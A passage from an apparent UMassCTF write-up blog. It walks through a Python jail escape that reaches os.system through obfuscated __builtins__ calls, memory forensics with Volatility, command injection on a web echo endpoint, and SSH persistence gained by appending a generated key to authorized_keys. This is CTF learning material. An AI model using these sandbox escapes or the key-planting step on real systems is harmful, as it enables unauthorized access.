highlighter-rouge\">&gt;&gt;&gt;</code> line beginning looks awfully similar to python interpreter. And the gibberish text is likely to be encoded with substitution ciphers.<br />After a bit of <code class=\"language-plaintext highlighter-rouge\">googling</code>, I eventually landed on a correct webpage to translate the gibberish to something readable. <a href=\"https://awsm-tools.com\">https://awsm-tools.com</a></p><p><img src=\"/assets/img/umass/ekrpat/decoded.png\" alt=\"Decoded message\" /></p><p>After toying with the python3 interpreter and <code class=\"language-plaintext highlighter-rouge\">googling</code> a bit. I found a workaround for this simple jail escaping challenge.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">__builtins__</span><span class=\"p\">.</span><span class=\"n\">__dict__</span><span class=\"p\">[</span><span class=\"s\">'IMPORT'</span><span class=\"p\">.</span><span class=\"n\">lower</span><span class=\"p\">()](</span><span class=\"s\">'OS'</span><span class=\"p\">.</span><span class=\"n\">lower</span><span class=\"p\">()).</span><span class=\"n\">__dict__</span><span class=\"p\">[</span><span class=\"s\">'SYSTEM'</span><span class=\"p\">.</span><span class=\"n\">lower</span><span class=\"p\">()](</span><span class=\"s\">'ls'</span><span class=\"p\">)</span></code></pre></div></div><p><img src=\"/assets/img/umass/ekrpat/ls.png\" alt=\"list directory\" /></p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"n\">__builtins__</span><span class=\"p\">.</span><span class=\"n\">__dict__</span><span class=\"p\">[</span><span class=\"s\">'IMPORT'</span><span class=\"p\">.</span><span class=\"n\">lower</span><span class=\"p\">()](</span><span class=\"s\">'OS'</span><span class=\"p\">.</span><span class=\"n\">lower</span><span class=\"p\">()).</span><span class=\"n\">__dict__</span><span class=\"p\">[</span><span class=\"s\">'SYSTEM'</span><span class=\"p\">.</span><span class=\"n\">lower</span><span class=\"p\">()](</span><span class=\"s\">'cat flag'</span><span class=\"p\">)</span></code></pre></div></div><p><img src=\"/assets/img/umass/ekrpat/cat.png\" alt=\"cat flag\" /></p><hr /><h3 id=\"4-scan-me-misc\">4. <a id=\"scan_me\" style=\"text-decoration:none;\">Scan me [misc]</a></h3><p>The challenge statement:</p><blockquote>  <p>The top layer is a lie.<br /><a href=\"/assets/img/umass/scanme/scan_me.xcf\" download=\"\">scan_me.xcf</a></p></blockquote><p>Lookup: The XCF, short for eXperimental Computing Facility, is the native image format of the GIMP image-editing program. I don’t have the GIMP so I have used an online tool to convert XCF to JPG.</p><p><img src=\"/assets/img/umass/scanme/scan_me.jpg\" alt=\"Scan me JPG\" width=\"100\" /></p><p>This is a QR code recovery challenge. I have done my research on the topic. It is possible with <a href=\"https://merricx.github.io/qrazybox/\">some tool</a> and effort, one could try to recover the lost data with certain precisions. I have to admit that this has been the finest artwork of mine in a while.</p><p><img src=\"/assets/img/umass/scanme/art.png\" alt=\"QR recovery\" /></p><p>After signed my fine artwork, <a href=\"https://play.google.com/store/apps/details?id=com.gamma.scan&amp;hl=en&amp;gl=US\">QR &amp; barcode scanner</a> did the magic and extracted <code class=\"language-plaintext highlighter-rouge\">https://imgur.com/a/57VgQ8M</code>. Flag was <code class=\"language-plaintext highlighter-rouge\">UMASS{QR-3Z-m0d3}</code></p><hr /><h3 id=\"5-jeopardy-misc\">5. <a id=\"jeopardy\" style=\"text-decoration:none;\">Jeopardy [misc]</a></h3><p>The challenge statement:</p><blockquote>  <p>This is Jail-pardy!<br />nc 34.72.64.224 8082<br />nc 35.231.20.75 8082<br /> There has been confusion over Miscellaneous 200. The answer is “ios”, it is misleading. My bad. Good luck and enjoy! :)</p></blockquote><p><img src=\"/assets/img/umass/jeopardy/jeopardy.png\" alt=\"Jeopardy\" /></p><p>This challenge had 25 quizz questions to unlock letters and characters that you can use in the python3 interpreter to escape the jail. Oh boy, it took me hours to correctly answer 21/25 questions.</p><ol>  <li>    <p>Miscellaneous 100 - Name a sponsor of UMassCTF: <code class=\"language-plaintext highlighter-rouge\">HackTheBox</code><br /> Correct! You have been awarded the following characters: ‘`’</p>  </li>  <li>    <p>Miscellaneous 200 - This was the most popular OS that was used in 2020: <code class=\"language-plaintext highlighter-rouge\">ios</code><br /> Correct! You have been awarded the following characters: ‘r’</p>  </li>  <li>    <p>Miscellaneous 300 - The answer to the life, universe, everything? In binary, of course: <code class=\"language-plaintext highlighter-rouge\">101010</code><br /> Correct! You have been awarded the following characters: ‘h’</p>  </li>  <li>    <p>Miscellaneous 400 - If there are 6 apples and you take away 4, how many do you have? <code class=\"language-plaintext highlighter-rouge\">4</code><br /> Correct! You have been awarded the following characters: ‘,’, ‘~’</p>  </li>  <li>    <p>Miscellaneous 10000 - The UMass Cybersecurity club holds many talks from a wide variety of industry professionals in the tech scene. One such company may have leaked a password to something they were demoing during their presentation but did not care. What was the password displayed on the screen?</p>    <p>This question made me watch several videos and try several passwords. From <a href=\"https://youtu.be/lI4c8DVdSl4?t=1123\">SQL Injection video</a>, promising wrong passwords: <code class=\"language-plaintext highlighter-rouge\">62d754cc350e84d3b1c32ae79f976f5348e74a40</code>, <code class=\"language-plaintext highlighter-rouge\">seb</code>, <code class=\"language-plaintext highlighter-rouge\">6885858486f31043e5839c735d99457f045affd0 </code>, <code class=\"language-plaintext highlighter-rouge\">bug</code>. After a decade, <a href=\"https://youtu.be/Ph2ojl3qbmI?t=641\">this video</a> shows <code class=\"language-plaintext highlighter-rouge\">gSH1GgcJHimHy0XaMn</code>.<br /> Correct! You have been awarded the following characters: ‘a’, ‘b’, ‘d’, ‘f’, ‘g’, ‘i’, ‘w’, ‘y’, ‘z’</p>  </li>  <li>    <p>Cybersecurity Tomorrow 100 - This type of computing that has much promise for the future poses a great threat to encryption schemes commonly used today: <code class=\"language-plaintext highlighter-rouge\">quantum computing</code><br /> Correct! You have been awarded the following characters: “’”</p>  </li>  <li>    <p>Cybersecurity Tomorrow 200 - This year will be the next y2k thanks to some data types: <code class=\"language-plaintext highlighter-rouge\">2038</code><br /> Correct! You have been awarded the following characters: ‘e’</p>  </li>  <li>    <p>Cybersecurity Tomorrow 300 - Said to be the number 1 risk or threat in cybersecurity for the foreseeable future</p>  </li>  <li>    <p>Cybersecurity Tomorrow 400 - This architecture of CPUs seems to have many benefits but has repeatedly had vulnerabilities found in it after major releases of them</p>  </li>  <li>    <p>Cybersecurity Tomorrow 500 - This technology that can be used to create fake events with real images is a serious concern for future cybersecurity: <code class=\"language-plaintext highlighter-rouge\">Deepfakes</code><br />Correct! You have been awarded the following characters: ‘m’, ‘n’, ‘o’</p>  </li>  <li>    <p>Cybersecurity Yesterday 100 - Nickname of one of the first “hackers” that is a cereal brand: <code class=\"language-plaintext highlighter-rouge\">Captain Crunch</code><br />Correct! You have been awarded the following characters: ‘%’</p>  </li>  <li>    <p>Cybersecurity Yesterday 200 - Movie where tic-tac-toe used to save the world? <code class=\"language-plaintext highlighter-rouge\">WarGames</code>Correct! You have been awarded the following characters: ‘1’</p>  </li>  <li>    <p>Cybersecurity Yesterday 300 - Country that US and Israeli has made multiple worms and malware against? <code class=\"language-plaintext highlighter-rouge\">Iran</code><br />Correct! You have been awarded the following characters: ‘c’</p>  </li>  <li>    <p>Cybersecurity Yesterday 400 - The first real use of cybersecurity against a virus was a program called the ___? <code class=\"language-plaintext highlighter-rouge\">The Reaper</code><br />Correct! You have been awarded the following characters: ‘.’</p>  </li>  <li>    <p>Cybersecurity Yesterday 500 - DoD wrote this during the cold war</p>  </li>  <li>    <p>Cybersecurity Now 100 - According to UMaryland Professor, a hacker attacks computers on average every ___ seconds? <code class=\"language-plaintext highlighter-rouge\">39</code><br />Correct! You have been awarded the following characters: ‘:’</p>  </li>  <li>    <p>Cybersecurity Now 200 - University of Michigan researchers controlled a Google Home from 230 feet away with what? <code class=\"language-plaintext highlighter-rouge\">laser</code><br />Correct! You have been awarded the following characters: ‘)’</p>  </li>  <li>    <p>Cybersecurity Now 300 - Band that was recently threatened to have unreleased music released unless they pay the hackers money: <code class=\"language-plaintext highlighter-rouge\">Radiohead</code><br />Correct! You have been awarded the following characters: ‘+’</p>  </li>  <li>    <p>Cybersecurity Now 400 - This company recently had their source code accessed in a huge breach: <code class=\"language-plaintext highlighter-rouge\">Microsoft</code><br />Correct! You have been awarded the following characters: ‘_’, ‘&lt;’</p>  </li>  <li>    <p>Cybersecurity Now 500 - What is a fairly new way to find electronics that law enforcement are using, i.e. Subway scandal</p>  </li>  <li>    <p>UMass 100 - What is the name of the mascot of UMass? <code class=\"language-plaintext highlighter-rouge\">Sam the Minuteman</code><br />Correct! You have been awarded the following characters: ‘(‘</p>  </li>  <li>    <p>UMass 200 - What is UMass most famously known for being #1 for? <code class=\"language-plaintext highlighter-rouge\">food</code><br />Correct! You have been awarded the following characters: ‘{‘</p>  </li>  <li>    <p>UMass 300 - What dining hall is hard-serve ice cream served at on campus everyday? <code class=\"language-plaintext highlighter-rouge\">Franklin</code><br />Correct! You have been awarded the following characters: ‘}’</p>  </li>  <li>    <p>UMass 400 - Where was the old honors college located? <code class=\"language-plaintext highlighter-rouge\">Orchard Hill Area</code><br />Correct! You have been awarded the following characters: ‘x’</p>  </li>  <li>    <p>UMass 500 - This flag was raised from a dorm in the central housing area in the 90s due to unrest from the residents: <code class=\"language-plaintext highlighter-rouge\">Jolly Roger</code><br />Correct! You have been awarded the following characters: ‘s’, ‘t’, ‘u’, ‘v’</p>  </li></ol><p>So far, I have access to <code class=\"language-plaintext highlighter-rouge\">(){},~:+_&lt;%.1</code> and <code class=\"language-plaintext highlighter-rouge\">abcdefghi[j][k][l]mno[p]rstuvwxyz</code>. Not all the questions are answered, but I have to settle with what I have got.The approach I have used is similar to what worked for the <a href=\"#ekrpat\"><code class=\"language-plaintext highlighter-rouge\">ekrpat</code></a> challenge.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">exec</span><span class=\"p\">(</span><span class=\"s\">'''__builtins__.__dict__['__import__']('os').__dict__['system']('ls')'''</span><span class=\"p\">)</span></code></pre></div></div><p>These are my workarounds for the characters/letters which I am not allowed to type in:</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"c1\"># j</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"c1\"># k</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"c1\"># l</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'o'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"c1\"># p</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">':'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"c1\"># [</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'&lt;'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"c1\"># ]</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"c1\"># ' - strangely '''text''' failing to escape ' sometimes.</span></code></pre></div></div><p>I have replaced all the non-allowed letters/characters with my workarounds to constructed the code.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">exec</span><span class=\"p\">(</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'o'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'rint(__bui'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">+</span> <span class=\"s\">'tins__.__dict__'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">':'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">''''__im'''</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'o'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'ort__'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'&lt;'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'''('os').__dict__'''</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">':'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">''''system'''</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'&lt;'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'('</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'s'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'))'</span><span class=\"p\">)</span></code></pre></div></div><p><img src=\"/assets/img/umass/jeopardy/ls.png\" alt=\"list dir\" /></p><p>And a minor adjustment to issue the <code class=\"language-plaintext highlighter-rouge\">cat flag.txt</code> command.</p><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"k\">exec</span><span class=\"p\">(</span><span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'o'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'rint(__bui'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">+</span> <span class=\"s\">'tins__.__dict__'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">':'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">''''__im'''</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'o'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'ort__'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'&lt;'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'''('os').__dict__'''</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">':'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">''''system'''</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'&lt;'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"o\">+</span><span class=\"mi\">11</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'('</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'cat f'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'i'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'ag.txt'</span> <span class=\"o\">+</span> <span class=\"nb\">chr</span><span class=\"p\">(</span><span class=\"nb\">ord</span><span class=\"p\">(</span><span class=\"s\">'%'</span><span class=\"p\">)</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"o\">+</span> <span class=\"s\">'))'</span><span class=\"p\">)</span></code></pre></div></div><p><img src=\"/assets/img/umass/jeopardy/flag.png\" alt=\"cat flag.txt\" /></p><p>Yeah, thank you, Alex. I really enjoyed the challenge despite the few hours of struggle.</p><hr /><h3 id=\"6-notes-forensics\">6. <a id=\"notes\" style=\"text-decoration:none;\">Notes [forensics]</a></h3><p>The challenge statement:</p><blockquote>  <p>The breach seems to have originated from this host. Can you find the user’s mistake? Here is a memory image of their workstation from that day.File: image.mem (PS: too big to reference)</p></blockquote><p>We have a memory dump to analyze to capture the flag. I came accross this sort of challenge before and remembered the <a href=\"https://github.com/volatilityfoundation/volatility\"><code class=\"language-plaintext highlighter-rouge\">volatility</code></a>.</p><p>To read the image information.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>vol.py imageinfo <span class=\"nt\">-f</span> ./image.memNFO    : volatility.debug    : Determining profile based on KDBG search...          Suggested Profile<span class=\"o\">(</span>s<span class=\"o\">)</span> : Win7SP1x64, Win7SP0x64, Win2008R2SP0x64, Win2008R2SP1x64_24000, Win2008R2SP1x64_23418, Win2008R2SP1x64, Win7SP1x64_24000, Win7SP1x64_23418...</code></pre></div></div><p>To see the process list.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>vol.py pslist <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x64 <span class=\"nt\">-f</span> ./image.memOffset<span class=\"o\">(</span>V<span class=\"o\">)</span>          Name                    PID   PPID   Thds     Hnds   Sess  Wow64 Start                          Exit                          <span class=\"nt\">------------------</span> <span class=\"nt\">--------------------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">--------</span> <span class=\"nt\">------</span> <span class=\"nt\">------</span> <span class=\"nt\">------------------------------</span> <span class=\"nt\">------------------------------</span>0xfffffa8000ca0040 System                    4      0    173      526 <span class=\"nt\">------</span>      0 2021-03-20 18:57:47 UTC+0000                                 ...                               0xfffffa8000dd0060 notepad.exe            2696   2288      4      309      1      0 2021-03-20 17:59:34 UTC+0000                                 ...0xfffffa800213e4e0 SearchFilterHo         1740   1888      5      103      0      0 2021-03-20 18:15:53 UTC+0000 </code></pre></div></div><p>To dump the <code class=\"language-plaintext highlighter-rouge\">notepad.exe</code> memory to file.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>volatility <span class=\"nt\">-f</span> ./image.mem <span class=\"nt\">--profile</span><span class=\"o\">=</span>Win7SP1x64 memdump <span class=\"nt\">--dump-dir</span><span class=\"o\">=</span>./ <span class=\"nt\">-p</span> 2696</code></pre></div></div><p>To find the flag using <code class=\"language-plaintext highlighter-rouge\">strings</code> and <code class=\"language-plaintext highlighter-rouge\">grep</code> functions.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>strings <span class=\"nt\">-e</span> l ./2696.dmp| <span class=\"nb\">grep</span> <span class=\"s2\">\"UMASS\"</span>UMASS<span class=\"o\">{</span><span class=\"nv\">$3CUR3_$70Rag3</span><span class=\"o\">}</span></code></pre></div></div><hr /><h1 id=\"7-webserver-forensics\">7. <a id=\"webserver\" style=\"text-decoration:none;\">Webserver [forensics]</a></h1><p>The challenge statement:</p><blockquote>  <p>Our webserver has a few flaws in it :(<br />http://34.72.232.191:8080<br />Link to a file: <a href=\"/assets/img/umass/webserver/a.out\">a.out</a></p></blockquote><p><img src=\"/assets/img/umass/webserver/webserver.png\" alt=\"Landing page\" /></p><p><img src=\"/assets/img/umass/webserver/message.png\" alt=\"echo endpoint\" /></p><p>I don’t think my solution is what the author had in mind. After all, he should have given us the <code class=\"language-plaintext highlighter-rouge\">a.out</code> file for a reason. As soon as I saw the <code class=\"language-plaintext highlighter-rouge\">/echo?message</code> endpoint I wanted to try a command execution. The dumb luck was on my side, it was a challenge that took the least effort from me.</p><p><img src=\"/assets/img/umass/webserver/luck.png\" alt=\"Lucky shot\" /></p><h1 id=\"8-hermit---part-2-web\">8. <a id=\"hermit2\" style=\"text-decoration:none;\">Hermit - Part 2 [web]</a></h1><p>The challenge statement:</p><blockquote>  <p>Who are you? How did you get here? You better zip on out of here or else.<br />104.197.195.221:8087<br />34.121.84.161:8087<br />(The server is likely not broken. If you really think it’s broken, create a support ticket.)<br />Hint 1: Try enumeration<br />Hint 2: The port you are looking for has been forwarded to 8087.</p></blockquote><p><img src=\"/assets/img/umass/hermit2/landing.png\" alt=\"Landing page\" /><img src=\"/assets/img/umass/hermit2/nc.png\" alt=\"NC\" /></p><p>My first impression was that this challenge may be out of my league. Initially, I thought there suppose to be a website running behind this ssh interface. So I googled a lot of random stuff like <code class=\"language-plaintext highlighter-rouge\">ssh tunnel</code>, <code class=\"language-plaintext highlighter-rouge\">ssh proxy</code> and <code class=\"language-plaintext highlighter-rouge\">ssh firewall</code> etc … Well, that was a fruitless few hours. People were solving it with a much better success rate. I read over the challenge statement again after a break. And that’s when the <code class=\"language-plaintext highlighter-rouge\">Hermit - Part2</code>, <code class=\"language-plaintext highlighter-rouge\">Part2</code> caught my eyes. I began to look at the challenge in a proper way.</p><ul>  <li>Task 1: Get access to the server using <code class=\"language-plaintext highlighter-rouge\">ssh</code></li>  <li>Task 2: Find the flag or access the local webserver running within server.And most importantly, I realized that somehow I could use the <code class=\"language-plaintext highlighter-rouge\">hermit</code> part1 vulnerability to solve the <code class=\"language-plaintext highlighter-rouge\">hermit</code> part2 challenge. Time to visit back to the <code class=\"language-plaintext highlighter-rouge\">hermit</code> one.</li></ul><p>To see the debain user name</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">whoami</span></code></pre></div></div><p><img src=\"/assets/img/umass/hermit2/whoami.png\" alt=\"whoami\" /></p><p>To check the hermit’s default ssh folder hoping to find a usable key pair. (I tried that weird looking <code class=\"language-plaintext highlighter-rouge\">id_ed25519</code> key but it was password protected.)</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">cat</span> /home/hermit/.ssh</code></pre></div></div><p><img src=\"/assets/img/umass/hermit2/ssh_keys.png\" alt=\"ssh keys\" /></p><p>To generate a new ssh key pair with no passphrase for myself.</p><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ssh-keygen <span class=\"nt\">-b</span> 2048 <span class=\"nt\">-t</span> rsa <span class=\"nt\">-f</span> /tmp/mediocre <span class=\"nt\">-q</span> <span class=\"nt\">-N</span> <span class=\"s2\">\"\"</span></code></pre></div></div><p><img src=\"/assets/img/umass/hermit2/ssh_keygen.png\" alt=\"ssh_keygen\" /></p><p>To get my private key content</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>cat /tmp/mediocre</code></pre></div></div><p><img src=\"/assets/img/umass/hermit2/private_key.png\" alt=\"get private key\" /></p><p>Here, I manually copied my private key content nicely into <code class=\"language-plaintext highlighter-rouge\">hermit.key</code> file on my local machine and set the proper permission.</p><p><img src=\"/assets/img/umass/hermit2/hermit_key.png\" alt=\"hermit key\" /></p><p>To add my public key to the <code class=\"language-plaintext highlighter-rouge\">authorized_keys</code> file.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>cat /tmp/mediocre.pub &gt;&gt; /home/hermit/.ssh/authorized_keys</code></pre></div></div><p><img src=\"/assets/img/umass/hermit2/authorized_keys.png\" alt=\"authorized_keys\" /></p><p>And tried to access the server via <code class=\"language-plaintext highlighter-rouge\">ssh</code> through the <code class=\"language-plaintext highlighter-rouge\">8087</code> port with my keys.<img src=\"/assets/img/umass/hermit2/access.png\" alt=\"ssh access\" /></p><p>From here on, I have tried a bunch of useless commands. Failed to find the other webserver which I imagined to be running there somewhere. In the end, I presumed that this 